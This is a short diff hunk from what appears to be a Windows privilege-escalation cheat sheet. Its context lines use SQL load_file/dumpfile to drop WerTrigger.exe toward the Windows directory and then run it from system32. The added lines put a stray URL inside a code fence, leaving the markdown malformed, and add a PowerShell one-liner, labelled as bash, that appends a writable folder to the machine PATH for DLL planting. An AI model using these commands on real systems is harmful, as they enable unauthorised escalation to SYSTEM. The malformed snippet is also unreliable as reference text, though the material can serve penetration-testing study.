@@ -1848,4 +1848,11 @@ select load_file('C:\\xampp\\htdocs\\WerTrigger.exe') into dumpfile 'C:\\Windows
 
 cd C:\windows\system32
 .\WerTrigger.exe
+```https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#sam-and-system-files
+```
+
+#### Watch over DLLs in a folder
+
+```bash
+$folderPath = "C:\java\jre\bin" ; if (!(Test-Path $folderPath -PathType Container)) {     New-Item -ItemType Directory -Path $folderPath | Out-Null } $envPath = [Environment]::GetEnvironmentVariable("PATH", "Machine") ; if ($envPath -notlike "*$folderPath*") {     $newPath = "$envPath;$folderPath"  ;   [Environment]::SetEnvironmentVariable("PATH", $newPath, "Machine") }
 ```
